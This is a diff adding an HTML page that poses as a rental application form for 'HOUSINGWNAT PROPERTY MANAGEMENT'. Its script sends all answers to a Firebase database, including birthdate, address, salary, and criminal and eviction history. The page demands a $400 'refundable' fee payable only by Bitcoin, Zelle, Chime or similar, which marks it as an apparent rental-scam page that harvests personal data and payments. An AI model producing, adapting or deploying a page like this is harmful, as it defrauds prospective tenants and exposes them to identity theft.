@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>HOUSINGWNAT PROPERTY MANAGEMENT - Application</title>
+
+
+<style>
+
+*{
+box-sizing:border-box;
+font-family:Arial,sans-serif;
+}
+
+body{
+
+margin:0;
+background:#f2f5f8;
+color:#333;
+
+}
+
+
+.header{
+
+background:#003366;
+color:white;
+text-align:center;
+padding:30px;
+
+}
+
+
+.header h1{
+
+font-size:32px;
+
+}
+
+
+.container{
+
+width:92%;
+max-width:850px;
+margin:30px auto;
+background:white;
+padding:30px;
+border-radius:12px;
+box-shadow:0 5px 15px #ccc;
+
+}
+
+
+
+h2{
+
+color:#003366;
+margin-bottom:20px;
+
+}
+
+
+
+label{
+
+font-weight:bold;
+display:block;
+margin-top:15px;
+
+}
+
+
+
+input,select,textarea{
+
+width:100%;
+padding:12px;
+margin-top:8px;
+border:1px solid #ccc;
+border-radius:6px;
+
+}
+
+
+.row{
+
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:15px;
+
+}
+
+
+button{
+
+width:100%;
+margin-top:25px;
+padding:15px;
+background:#28a745;
+color:white;
+border:none;
+border-radius:8px;
+font-size:18px;
+cursor:pointer;
+
+}
+
+
+button:hover{
+
+background:#218838;
+
+}
+
+
+
+.notice{
+
+background:#eef6ff;
+padding:15px;
+border-radius:8px;
+margin-top:20px;
+line-height:1.6;
+
+}
+
+
+
+footer{
+
+text-align:center;
+padding:20px;
+background:#003366;
+color:white;
+
+}
+
+
+
+@media(max-width:600px){
+
+.row{
+
+grid-template-columns:1fr;
+
+}
+
+}
+
+
+</style>
+
+</head>
+
+
+
+<body>
+
+
+<div class="header">
+
+<h1>
+HOUSINGWNAT PROPERTY MANAGEMENT
+</h1>
+
+<p>
+Rental Appointment and Application Form
+</p>
+
+</div>
+
+
+
+<div class="container">
+
+
+<form id="applicationForm">
+
+
+
+<h2>
+Property Information
+</h2>
+
+
+<label>
+The property for which you're seeking *
+</label>
+
+<input id="property" required>
+
+
+
+<label>
+Property street name / post code *
+</label>
+
+<input id="street" required>
+
+
+
+<label>
+Ideal date for viewing *
+</label>
+
+<input type="date" id="viewDate" required>
+
+
+
+<label>
+Time *
+</label>
+
+<input type="time" id="viewTime" required>
+
+
+
+
+
+<h2>
+Information About Prospective Tenants
+</h2>
+
+
+<div class="row">
+
+<div>
+
+<label>
+First Name *
+</label>
+
+<input id="firstName" required>
+
+</div>
+
+
+<div>
+
+<label>
+Last Name *
+</label>
+
+<input id="lastName" required>
+
+</div>
+
+</div>
+
+
+
+
+<label>
+Email *
+</label>
+
+<input type="email" id="email" required>
+
+
+
+<div class="row">
+
+<div>
+
+<label>
+Area Code
+</label>
+
+<input id="code">
+
+</div>
+
+
+<div>
+
+<label>
+Phone Number
+</label>
+
+<input id="phone">
+
+</div>
+
+
+</div>
+
+
+
+
+
+<label>
+Birthdate *
+</label>
+
+<input type="date" id="birthdate" required>
+
+
+
+
+<label>
+Applicant's Present Residence *
+</label>
+
+<input id="address" required>
+
+
+
+
+<label>
+Preferred Move in Date *
+</label>
+
+<input type="date" id="moveDate" required>
+
+
+
+
+<label>
+Do you have current employment? *
+</label>
+
+<select id="employment">
+
+<option>Yes</option>
+
+<option>No</option>
+
+</select>
+
+
+
+<label>
+Monthly Salary (USD)
+</label>
+
+<input id="salary" placeholder="$">
+
+
+
+
+
+<label>
+Do you intend to keep any pets? *
+</label>
+
+<select id="pets">
+
+<option>Yes</option>
+
+<option>No</option>
+
+</select>
+
+
+
+
+
+<label>
+Type a question
+</label>
+
+<textarea id="question"></textarea>
+
+
+
+
+<label>
+Do you engage in smoking?
+</label>
+
+<select id="smoking">
+
+<option>Yes</option>
+
+<option>No</option>
+
+</select>
+
+
+
+
+
+<label>
+Are there dependent children living with you?
+</label>
+
+<select id="children">
+
+<option>Yes</option>
+
+<option>No</option>
+
+</select>
+
+
+
+
+
+<label>
+Have you ever been convicted of a crime?
+</label>
+
+<select id="crime">
+
+<option>Yes</option>
+
+<option>No</option>
+
+</select>
+
+
+
+
+<label>
+Have you ever been evicted or requested to vacate a rental property?
+</label>
+
+<select id="evicted">
+
+<option>Yes</option>
+
+<option>No</option>
+
+</select>
+
+
+
+
+<label>
+Amount available to secure property (USD)
+</label>
+
+<input id="secure" placeholder="$">
+
+
+
+
+
+<div class="notice">
+
+
+<h3>
+UPON SUBMITTING THIS APPLICATION
+</h3>
+
+
+<p>
+
+By signing, I confirm the accuracy of the provided information. 
+I acknowledge this isn't a binding offer, and no explanation is required for declined tenancy.
+
+</p>
+
+
+<p>
+
+I consent to paying the refundable application fee of $400 with no cash/check accepted.
+
+</p>
+
+
+
+<label>
+Preferred payment method for refundable fee *
+</label>
+
+
+<select id="payment">
+
+<option>Bitcoin</option>
+
+<option>Zelle</option>
+
+<option>Apple Pay</option>
+
+<option>PayPal</option>
+
+<option>Chime</option>
+
+</select>
+
+
+</div>
+
+
+
+
+
+<button type="submit">
+
+Submit Application
+
+</button>
+
+
+
+</form>
+
+
+</div>
+
+
+
+<footer>
+
+© 2026 HOUSINGWNAT PROPERTY MANAGEMENT
+
+</footer>
+
+
+
+
+
+<script type="module">
+
+
+import { initializeApp } from 
+"https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+
+import { 
+getDatabase,
+ref,
+set,
+get,
+child
+} from 
+"https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+
+
+const firebaseConfig = {
+
+apiKey:"AIzaSyDPNzU_dZZFxT571eyYxuzS7KV7upr5Elk",
+
+authDomain:"housingwnat-propertymanagement.firebaseapp.com",
+
+databaseURL:
+"https://housingwnat-propertymanagement-default-rtdb.europe-west1.firebasedatabase.app",
+
+projectId:"housingwnat-propertymanagement",
+
+storageBucket:
+"housingwnat-propertymanagement.firebasestorage.app",
+
+messagingSenderId:"300392854046",
+
+appId:"1:300392854046:web:875ec558c91ca9a077340f"
+
+};
+
+
+
+const app = initializeApp(firebaseConfig);
+
+const db = getDatabase(app);
+
+
+
+
+
+document
+.getElementById("applicationForm")
+.addEventListener("submit", async(e)=>{
+
+
+e.preventDefault();
+
+
+
+let database = await get(ref(db,"Users"));
+
+let number = 1;
+
+
+if(database.exists()){
+
+number = Object.keys(database.val()).length + 1;
+
+}
+
+
+
+await set(
+ref(db,"Users/"+number+"/Details"),
+{
+
+
+property:
+property.value,
+
+street:
+street.value,
+
+viewDate:
+viewDate.value,
+
+viewTime:
+viewTime.value,
+
+
+firstName:
+firstName.value,
+
+lastName:
+lastName.value,
+
+email:
+email.value,
+
+phone:
+code.value+" "+phone.value,
+
+
+birthdate:
+birthdate.value,
+
+address:
+address.value,
+
+moveDate:
+moveDate.value,
+
+
+employment:
+employment.value,
+
+salary:
+salary.value,
+
+pets:
+pets.value,
+
+question:
+question.value,
+
+smoking:
+smoking.value,
+
+children:
+children.value,
+
+crime:
+crime.value,
+
+evicted:
+evicted.value,
+
+secure:
+secure.value,
+
+payment:
+payment.value,
+
+
+applicationDate:
+new Date().toString()
+
+
+});
+
+
+window.location.href="nextpage.html";
+
+
+});
+
+
+</script>
+
+
+</body>
+
+</html>
